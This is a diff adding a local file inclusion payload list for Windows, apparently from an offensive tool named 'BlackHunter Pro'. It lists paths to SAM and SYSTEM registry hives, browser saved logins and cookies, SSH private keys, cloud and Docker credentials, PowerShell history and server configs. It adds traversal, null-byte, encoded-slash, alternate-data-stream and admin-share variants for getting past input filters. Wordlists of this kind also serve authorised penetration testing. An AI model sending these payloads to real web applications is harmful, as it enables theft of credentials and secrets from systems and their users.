@@ -1,0 +1,357 @@
+# payloads/lfi/windows.txt
+# Windows File Paths for LFI
+# BlackHunter Pro
+
+# =============================================
+# SYSTEM FILES
+# =============================================
+
+C:\Windows\win.ini
+C:\Windows\system.ini
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\System32\drivers\etc\networks
+C:\Windows\System32\drivers\etc\services
+C:\Windows\System32\drivers\etc\protocol
+C:\Windows\System32\config\SAM
+C:\Windows\System32\config\SECURITY
+C:\Windows\System32\config\SYSTEM
+C:\Windows\System32\config\SOFTWARE
+C:\Windows\System32\config\DEFAULT
+C:\Windows\System32\config\RegBack\SAM
+C:\Windows\System32\config\RegBack\SECURITY
+C:\Windows\System32\config\RegBack\SYSTEM
+C:\Windows\System32\config\RegBack\SOFTWARE
+C:\Windows\System32\config\RegBack\DEFAULT
+C:\Windows\repair\SAM
+C:\Windows\repair\SYSTEM
+C:\Windows\repair\SECURITY
+C:\Windows\repair\SOFTWARE
+C:\Windows\repair\DEFAULT
+C:\Windows\repair\sam
+C:\Windows\repair\system
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattended.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\Panther\Unattend\Unattended.xml
+C:\Windows\System32\eula.txt
+C:\Windows\System32\license.rtf
+C:\Windows\System32\LogFiles\
+C:\Windows\IIS.log
+C:\Windows\iis.log
+C:\Windows\debug\NetSetup.log
+C:\Windows\debug\WIA\
+C:\Windows\SoftwareDistribution\Download\
+C:\Windows\Temp\
+C:\Windows\Temp\*
+C:\Windows\win.ini
+C:\Windows\system.ini
+C:\Windows\System32\config\systemprofile\NTUSER.DAT
+C:\Windows\System32\config\systemprofile\AppData\
+C:\Windows\System32\LogFiles\W3SVC1\
+C:\Windows\System32\LogFiles\HTTPERR\
+C:\Windows\System32\inetsrv\config\applicationHost.config
+C:\Windows\System32\inetsrv\config\administration.config
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\web.config
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+C:\Windows\Microsoft.NET\Framework\v2.0.50727\Config\web.config
+C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Config\web.config
+
+# =============================================
+# BOOT FILES
+# =============================================
+
+C:\boot.ini
+C:\autoexec.bat
+C:\config.sys
+C:\ntldr
+C:\NTDETECT.COM
+C:\bootmgr
+C:\BOOTNXT
+
+# =============================================
+# USER FILES
+# =============================================
+
+C:\Users\Administrator\.bash_history
+C:\Users\Administrator\.ssh\id_rsa
+C:\Users\Administrator\.ssh\authorized_keys
+C:\Users\Administrator\.ssh\known_hosts
+C:\Users\Administrator\Desktop\
+C:\Users\Administrator\Documents\
+C:\Users\Administrator\Downloads\
+C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\
+C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Login Data
+C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Cookies
+C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\History
+C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\Login Data
+C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\Cookies
+C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\History
+C:\Users\Administrator\AppData\Roaming\Mozilla\Firefox\Profiles\
+C:\Users\Administrator\NTUSER.DAT
+C:\Users\Administrator\ntuser.ini
+C:\Users\Administrator\.aws\credentials
+C:\Users\Administrator\.docker\config.json
+C:\Users\Administrator\.kube\config
+C:\Users\Administrator\.gitconfig
+C:\Users\Administrator\.npmrc
+C:\Users\Administrator\.netrc
+C:\Users\Public\
+C:\Users\Public\Documents\
+C:\Users\Public\Downloads\
+C:\Users\Default\NTUSER.DAT
+C:\Documents and Settings\Administrator\.bash_history
+C:\Documents and Settings\Administrator\Desktop\
+C:\Documents and Settings\Administrator\My Documents\
+C:\Documents and Settings\All Users\Application Data\
+
+# =============================================
+# IIS / WEB FILES
+# =============================================
+
+C:\inetpub\wwwroot\index.asp
+C:\inetpub\wwwroot\index.aspx
+C:\inetpub\wwwroot\web.config
+C:\inetpub\wwwroot\global.asax
+C:\inetpub\wwwroot\.htaccess
+C:\inetpub\wwwroot\config.aspx
+C:\inetpub\wwwroot\connect.aspx
+C:\inetpub\wwwroot\database.aspx
+C:\inetpub\wwwroot\admin\
+C:\inetpub\logs\LogFiles\
+C:\inetpub\logs\LogFiles\W3SVC1\
+C:\inetpub\temp\
+C:\inetpub\history\
+C:\inetpub\custerr\
+
+# =============================================
+# XAMPP / WAMP / LARAGON
+# =============================================
+
+C:\xampp\apache\conf\httpd.conf
+C:\xampp\apache\logs\access.log
+C:\xampp\apache\logs\error.log
+C:\xampp\php\php.ini
+C:\xampp\phpMyAdmin\config.inc.php
+C:\xampp\mysql\bin\my.ini
+C:\xampp\mysql\data\mysql\user.MYD
+C:\xampp\mysql\data\mysql\user.MYI
+C:\xampp\mysql\data\mysql\user.frm
+C:\xampp\passwords.txt
+C:\xampp\security\htpasswd
+C:\xampp\security\webdav.htpasswd
+C:\xampp\htdocs\index.php
+C:\xampp\htdocs\config.php
+C:\xampp\htdocs\wp-config.php
+C:\xampp\htdocs\.env
+C:\wamp\bin\apache\apache2.4.9\conf\httpd.conf
+C:\wamp\bin\apache\apache2.4.9\logs\access.log
+C:\wamp\bin\apache\apache2.4.9\logs\error.log
+C:\wamp\bin\php\php5.5.12\php.ini
+C:\wamp\bin\mysql\mysql5.6.17\my.ini
+C:\wamp\www\index.php
+C:\wamp\www\config.php
+C:\wamp\www\wp-config.php
+C:\laragon\etc\apache2\httpd.conf
+C:\laragon\etc\nginx\nginx.conf
+C:\laragon\etc\php\php.ini
+C:\laragon\www\index.php
+C:\laragon\www\config.php
+
+# =============================================
+# PROGRAM FILES
+# =============================================
+
+C:\Program Files\Apache Group\Apache\conf\httpd.conf
+C:\Program Files\Apache Group\Apache\logs\access.log
+C:\Program Files\Apache Group\Apache\logs\error.log
+C:\Program Files\Apache Software Foundation\Apache2.2\conf\httpd.conf
+C:\Program Files\Apache Software Foundation\Apache2.4\conf\httpd.conf
+C:\Program Files\MySQL\MySQL Server 5.7\my.ini
+C:\Program Files\MySQL\MySQL Server 8.0\my.ini
+C:\Program Files\PostgreSQL\data\pg_hba.conf
+C:\Program Files\PostgreSQL\data\postgresql.conf
+C:\Program Files\Microsoft SQL Server\90\Tools\Binn\
+C:\Program Files\Microsoft SQL Server\100\Tools\Binn\
+C:\Program Files\Microsoft SQL Server\110\Tools\Binn\
+C:\Program Files\Microsoft SQL Server\120\Tools\Binn\
+C:\Program Files\Microsoft SQL Server\130\Tools\Binn\
+C:\Program Files\Microsoft SQL Server\140\Tools\Binn\
+C:\Program Files\Microsoft SQL Server\150\Tools\Binn\
+C:\Program Files\Microsoft SQL Server\MSSQL\LOG\ERRORLOG
+C:\Program Files\Microsoft SQL Server\MSSQL\DATA\master.mdf
+C:\Program Files\Microsoft\Exchange Server\
+C:\Program Files\OpenSSH\etc\sshd_config
+C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
+C:\Program Files (x86)\Apache Software Foundation\Apache2.2\conf\httpd.conf
+C:\Program Files (x86)\MySQL\MySQL Server 5.7\my.ini
+C:\Program Files (x86)\PostgreSQL\data\pg_hba.conf
+
+# =============================================
+# NETWORK SHARES
+# =============================================
+
+\\localhost\c$\Windows\win.ini
+\\localhost\c$\boot.ini
+\\127.0.0.1\c$\Windows\win.ini
+\\127.0.0.1\c$\boot.ini
+\\localhost\admin$\system32\config\SAM
+\\localhost\admin$\system32\config\SYSTEM
+\\localhost\c$\inetpub\wwwroot\web.config
+\\localhost\c$\xampp\apache\conf\httpd.conf
+\\localhost\c$\xampp\php\php.ini
+
+# =============================================
+# WINDOWS PATHS WITH FORWARD SLASHES
+# =============================================
+
+C:/Windows/win.ini
+C:/Windows/system.ini
+C:/Windows/System32/drivers/etc/hosts
+C:/Windows/System32/config/SAM
+C:/Windows/System32/config/SYSTEM
+C:/boot.ini
+C:/inetpub/wwwroot/web.config
+C:/xampp/apache/conf/httpd.conf
+C:/xampp/php/php.ini
+C:/wamp/www/index.php
+
+# =============================================
+# DOUBLE BACKSLASH VARIANTS
+# =============================================
+
+C:\\Windows\\win.ini
+C:\\Windows\\system.ini
+C:\\Windows\\System32\\drivers\\etc\\hosts
+C:\\Windows\\System32\\config\\SAM
+C:\\Windows\\System32\\config\\SYSTEM
+C:\\boot.ini
+C:\\inetpub\\wwwroot\\web.config
+C:\\xampp\\apache\\conf\\httpd.conf
+C:\\xampp\\php\\php.ini
+
+# =============================================
+# NULL BYTE VARIANTS
+# =============================================
+
+C:\Windows\win.ini%00
+C:\Windows\win.ini%00.jpg
+C:\Windows\win.ini%00.png
+C:\Windows\win.ini%00.php
+C:\Windows\win.ini\0
+C:\Windows\win.ini\0.jpg
+C:\boot.ini%00
+C:\boot.ini%00.jpg
+C:\inetpub\wwwroot\web.config%00
+C:\xampp\apache\conf\httpd.conf%00
+
+# =============================================
+# PATH TRAVERSAL VARIANTS
+# =============================================
+
+..\..\..\..\..\..\..\..\..\..\Windows\win.ini
+..\..\..\..\..\..\..\..\..\..\boot.ini
+..\..\..\..\..\..\..\..\..\..\Windows\System32\drivers\etc\hosts
+..%5c..%5c..%5c..%5cWindows\win.ini
+..%5c..%5c..%5c..%5cboot.ini
+....\\....\\....\\....\\Windows\win.ini
+....\/....\/....\/....\/Windows\win.ini
+
+# =============================================
+# SPECIAL DEVICE NAMES
+# =============================================
+
+\\.\C:\Windows\win.ini
+\\.\C:\boot.ini
+\\.\PhysicalDrive0
+\\.\PhysicalDrive1
+C:\\.\C:\Windows\win.ini
+\\?\C:\Windows\win.ini
+\\?\C:\boot.ini
+
+# =============================================
+# ALTERNATE DATA STREAMS (ADS)
+# =============================================
+
+C:\Windows\win.ini:ads
+C:\Windows\win.ini::$DATA
+C:\boot.ini::$DATA
+C:\inetpub\wwwroot\web.config::$DATA
+C:\xampp\apache\conf\httpd.conf::$DATA
+C:\Windows\System32\config\SAM::$DATA
+
+# =============================================
+# SHORT (8.3) NAMES
+# =============================================
+
+C:\PROGRA~1\
+C:\PROGRA~2\
+C:\WINDOW~1\
+C:\DOCUME~1\
+C:\XAMPP~1\
+C:\Windows\System32\config\SAM
+C:\Windows\SysWOW64\config\SAM
+
+# =============================================
+# SENSITIVE CONFIG FILES
+# =============================================
+
+C:\Windows\System32\inetsrv\config\applicationHost.config
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\machine.config
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\machine.config
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\web.config
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\System32\drivers\etc\networks
+C:\Windows\System32\drivers\etc\protocol
+C:\Windows\System32\drivers\etc\services
+C:\Windows\System32\config\RegBack\SAM
+C:\Windows\System32\config\RegBack\SYSTEM
+C:\Windows\System32\config\RegBack\SECURITY
+C:\Windows\System32\config\RegBack\SOFTWARE
+
+# =============================================
+# POWERSHELL HISTORY
+# =============================================
+
+C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+# =============================================
+# CHROME / EDGE / FIREFOX DATA
+# =============================================
+
+C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Login Data
+C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Cookies
+C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\History
+C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Web Data
+C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\Login Data
+C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\Cookies
+C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\History
+C:\Users\Administrator\AppData\Roaming\Mozilla\Firefox\Profiles\
+C:\Users\Administrator\AppData\Roaming\Opera Software\Opera Stable\Login Data
+C:\Users\Administrator\AppData\Roaming\Opera Software\Opera Stable\Cookies
+
+# =============================================
+# REMOTE DESKTOP
+# =============================================
+
+C:\Users\Administrator\AppData\Local\Microsoft\Terminal Server Client\Default.rdp
+C:\Users\Administrator\AppData\Local\Microsoft\Terminal Server Client\Servers\
+C:\Users\Administrator\Documents\Default.rdp
+
+# =============================================
+# SSH AND KEYS
+# =============================================
+
+C:\Users\Administrator\.ssh\id_rsa
+C:\Users\Administrator\.ssh\id_dsa
+C:\Users\Administrator\.ssh\id_ecdsa
+C:\Users\Administrator\.ssh\id_ed25519
+C:\Users\Administrator\.ssh\authorized_keys
+C:\Users\Administrator\.ssh\known_hosts
+C:\Users\Administrator\.ssh\config
+C:\ProgramData\ssh\ssh_host_rsa_key
+C:\ProgramData\ssh\ssh_host_dsa_key
+C:\ProgramData\ssh\ssh_host_ecdsa_key
+C:\ProgramData\ssh\ssh_host_ed25519_key
